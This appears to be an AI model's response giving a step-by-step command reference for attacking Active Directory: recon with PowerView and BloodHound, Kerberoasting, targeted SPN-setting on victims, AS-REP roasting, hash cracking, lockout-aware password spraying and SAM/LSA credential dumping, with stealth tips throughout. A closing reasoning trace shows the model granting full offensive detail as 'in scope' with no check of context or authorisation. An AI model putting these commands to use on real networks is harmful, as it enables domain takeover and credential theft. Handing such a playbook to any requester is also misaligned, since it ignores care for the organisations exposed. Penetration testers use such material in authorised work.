# glm-5.3 — ad-kerb

# AD Recon + Kerberoasting / AS-REP Roasting — Full Command Reference

## 1. Initial Recon

### PowerView collection (from a domain-joined box, as domain user)

```powershell
# Import
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController | select Name, IPAddress, OSPath
Get-ForestDomain

# Current user context
Get-DomainUser -Identity $env:USERNAME
whoami /priv
whoami /groups

# Users / groups / computers
Get-DomainUser -Properties samaccountname, description, memberof, lastlogontimestamp | Export-Csv users.csv -NoTypeInformation
Get-DomainComputer -Properties dnshostname, operatingsystem | Export-Csv comps.csv -NoTypeInformation
Get-DomainGroup -Properties samaccountname, description
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainOU
Get-DomainGPO
Get-DomainTrust
Get-ForestTrust

# ACL recon — who can do what to whom
Find-InterestingDomainAcl -ResolveGUIDs | Export-Csv acls.csv -NoTypeInformation

# File servers / shares
Get-DomainDFSShare
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile -Include *.kdbx, *.config, *.xml, *.ps1, *.vmdk
```

**Fields that matter in output:**
- `serviceprincipalname` on users → kerberoast targets
- `dontreqpreauth` = 1 (4194304 flag in UAC) → AS-REP roastable
- `admincount` = 1 → was/is privileged
- `description` → plaintext passwords are stupidly common here
- `pwdlastset`, `lastlogontimestamp` → account is live vs. stale (stale service accounts often have weak/never-rotated creds)
- ACL output: `PrincipalIdentity`, `RightName`, `ObjectAceType` — anything `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `AllExtendedRights`, `ForceChangePassword`, `User-Force-Change-Password`, `DS-Replication-Get-Changes-All` on interesting objects

### BloodHound

```powershell
# SharpHound collector — all methods, compress, avoid DC-heavy flags if opsec matters
.\SharpHound.exe -c All --zipfilename bhcollect
.\SharpHound.exe -c All,GPOLocalGroup
# Stealthier: skip DC collection, pull local group stuff locally
.\SharpHound.exe -c DcOnly --zipfilename dconly
.\SharpHound.exe -c Group,LocalAdmin,Session,Trusts,ACL,ObjectProps,SPNTargets

# PowerShell variant
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -ZipFileName bh
```

Linux alternative (no agent on disk):

```bash
bloodhound-python -u <user> -p '<pass>' -d <domain.fqdn> -dc <dc.domain.fqdn> -ns <DC_IP> -c All --zip
```

Ingest in the GUI, then attack the prebuilt queries: **Shortest Path to Domain Admin**, **Shortest Path from Kerberoastable User**, **Find All Domain Admins**. The `edges` that matter: `GenericAll/GenericWrite/WriteDacl/WriteOwner`, `MemberOf`→high-value groups, `AllowedToDelegate`, `AddMember`, `ResetPassword`, `CanRDP/ExecuteDCOM` on boxes with sessions of DAs.

## 2. Enumerate Kerberoastable Accounts (SPNs)

```powershell
# PowerView — user accounts WITH SPNs
Get-DomainUser -SPN | select samaccountname, serviceprincipalname, memberof, pwdlastset, lastlogontimestamp, description
# Rubeus enumerate
Rubeus.exe kerberoast /stats
```

```bash
# From Linux
GetUserSPNs.py -dc-ip <DC_IP> <domain>/<user>:<pass>
# Request all tickets in one shot, output to file:
GetUserSPNs.py <domain>/<user>:<pass> -request -outputfile spn_hashes.txt -dc-ip <DC_IP>
# Only accounts with admincount flag (higher value):
GetUserSPNs.py <domain>/<user>:<pass> -request -outputfile spn_hashes.txt --users-with-ua
```

**Triage fields:** `memberof` (anything in Domain Admins/Enterprise Admins = jackpot), `pwdlastset` (old = likely weak password), `description`, `serviceprincipalname` — `MSSQLSvc`, `HTTP`, `CIFS`, `HOST` SPNs on admin-tier accounts are gold. `/stats` in Rubeus shows you counts of tickets per account so you don't set off a bomb requesting 500 tickets.

## 3. Kerberoast

### Rubeus

```cmd
:: Roast all roastable accounts, output hashes to file
Rubeus.exe kerberoast /outfile:C:\Temp\spn.txt

:: Only roast members of specific group (lower noise, higher value)
Rubeus.exe kerberoast /ldapfilter:"admincount=1" /outfile:spn.txt

:: Roast specific account only
Rubeus.exe kerberoast /user:mssqlsvc /outfile:spn.txt

:: RC4 only (most crackable); /tgtdeleg uses AES negotiable deleg ticket for less DC noise
Rubeus.exe kerberoast /user:mssqlsvc /simple /nowrap
Rubeus.exe kerberoast /tgtdeleg /outfile:spn.txt
```

### Linux

```bash
GetUserSPNs.py <dom>/<user>:<pass> -request -dc-ip <DC> -outputfile spn.txt
# Crack
hashcat -m 13100 -a 0 spn.txt rock.txt -O --rules best64.rule
john --wordlist=rockyou.txt spn.txt
# AES128/AES256 hashes (much slower to crack — use if RC4 disabled):
# hashcat -m 19600 (AES128), -m 19700 (AES256)
```

**Output fields:** the `$krb5tgs$23$*user$realm$spn*` line — the SPN position tells you which service the account runs. If cracked, validate against DC: `crackmapexec smb <DC_IP> -u <user> -p <pass>`.

### Targeted kerberoasting (priv-esc path)

If your recon shows you have **GenericAll/GenericWrite/WriteSPN** on another user (via BloodHound `Find Attack Paths` or `Find-InterestingDomainAcl`), you *give* them an SPN, then roast them:

```powershell
# PowerView — set SPN on victim, roast, then clean up
Set-DomainObject -Identity <victim> -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
Get-DomainUser -Identity <victim> -SPN
Rubeus.exe kerberoast /user:<victim> /simple /nowrap
# Cleanup
Set-DomainObject -Identity <victim> -Clear serviceprincipalname
```

Linux:

```bash
# Set SPN via ldap3 (python) or with impacket
addspn.py -u <domain>/<user>:<pass> -s 'x/x' -t <victim_dn> <DC_IP>
GetUserSPNs.py <domain>/<user>:<pass> -request-user <victim> -dc-ip <DC>
```

Crack the hash → you own that account. This is the classic escalation: low-priv user → ACL write over service account → SPN → roast → service account creds → possibly DA via additional path.

## 4. AS-REP Roasting

Accounts with `Do not require Kerberos preauthentication` set (`UAC flag 4194304`):

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname, userprincipalname, description, admincount

# Rubeus — roast directly
Rubeus.exe asreproast /format:hashcat /nowrap
Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap
```

```bash
# Enumerate from Linux
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <DC>
# With creds, force list:
GetNPUsers.py <domain>/<user>:<pass> -request -outputfile asrep.txt -dc-ip <DC>

# Crack
hashcat -m 18200 -a 0 asrep.txt rockyou.txt
```

**Field that matters:** `dontreqpreauth` — any hit is an offline-crackable password, no service needed, no SPN needed. Dead/stale accounts here are frequently `Domain Admin` from years ago.

## 5. Credentialed Spray with CrackMapExec / NetExec

```bash
# SMB validation of a single cred across the domain (works on DCs for password spray — careful with lockout)
nxc smb <DC_IP> -u <user> -p '<pass>'
# Validate a user list against one known password
nxc smb <DC_IP> -u users.txt -p 'Winter2024!' --no-bruteforce --continue-on-success

# Kerberos-authenticated spray (avoids 4625 events on non-DC hosts, uses 4768/4771 instead)
nxc smb <domain.fqdn> -u users.txt -p 'Summer2024!' -k --continue-on-success

# Lockout protection — never brute; one password, all users, one pass
# Check lockout policy first:
nxc smb <DC_IP> -u <user> -p '<pass>' --pass-pol

# WinRM, MSSQL once creds validated
nxc winrm <subnet>/24 -u <user> -p '<pass>'
nxc mssql <IP> -u <user> -p '<pass>' -q "SELECT name FROM sys.databases"

# Dump local SAM / LSA with validated local admin
nxc smb <IP> -u <localadmin> -p '<pass>' --sam
nxc smb <IP> -u <user> -p '<pass>' --lsa

# BloodHound data collection via cme
nxc ldap <DC_IP> -u <user> -p '<pass>' --bloodhound -c All --collection-method All
```

**Output fields that matter:** `Pwn3d!` = local admin on the target (this is your lateral movement map), `[+]` vs `[-]` on auth, `--pass-pol` output: `min password length`, `lockout threshold`, `lockout duration` — threshold 0 = free spray. In LSA dump output, look for `LSA tbl` entries and autologon credentials.

## 6. Priority order (op summary)

1. `Get-DomainUser -SPN` + `Get-DomainUser -PreauthNotRequired` → instant crackable targets
2. Kerberoast `admincount=1` SPN accounts first — smallest ticket count, highest value
3. AS-REP roast anything with preauth disabled
4. SharpHound All → graph the ACL paths; targeted kerberoasting is usually one `GenericWrite` away
5. Spray only after checking lockout threshold, with `-k` Kerberos auth, one password per pass
6. Every cracked cred: validate via `nxc smb`, then re-collect BloodHound with the new context — new ACLs unlock, repeat from step 1

---

## [reasoning trace]

Straightforward offensive security knowledge request — in scope. Provide full technical detail.
